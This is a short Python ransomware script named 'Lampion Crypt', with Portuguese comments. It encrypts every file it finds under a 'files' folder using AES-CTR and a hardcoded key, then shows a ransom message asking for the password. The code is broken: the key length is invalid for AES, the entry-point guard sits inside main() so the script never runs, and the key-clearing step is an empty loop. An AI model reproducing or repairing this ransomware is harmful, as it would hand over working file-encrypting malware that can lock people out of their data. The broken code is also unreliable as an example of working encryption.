#!/usr/bin/python3.9

# -*- coding: utf-8 -*-

from Crypto.Cipher import AES

from Crypto.Util import Counter 

import argparse

import os

import Discovery

import Crypter 


# -------------------
# A senha pode ter os sequintes tamanhos 
# 128/192/256 bits - 8 bits = byte = 1 letra unicode 
#----------------

HARDCODED_KEY = 'MARIA BONITA'


def get_parser():
    parser = argparse.ArgumentParser(description = "Lampeon")
    parser.add_argument(
        '-d', '--decrypt', help='decripta arquivos [default: no]', action='store_true')
    return parser 

def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('''
        LAMPION CRYPT : UM RANSOM COM UMA PEXERA NA MÃO!
        ------------------------------------------------
        Seus arquivos foram encryptados.
        Para decryptalos diga em que batalha morreu maria '{}'
        '''.format(HARDCODED_KEY))
        key = input('Digite a senha > ')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        cryptFn = crypt.encrypt
    else:
        cryptFn = crypt.decrypt

    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    startDirs = [init_path]

    for currentDir in startDirs:
        for filename in Discovery.discover(currentDir):
            Crypter.change_files(filename, cryptFn)


    # Clear crypto key

    for _ in range(100):
        pass
    if not decrypt:
        # ZOEIRA
        pass 

    # After encryption, you can change the wallpaper
    # alter icons


    if __name__ == '__main__':
        main() 

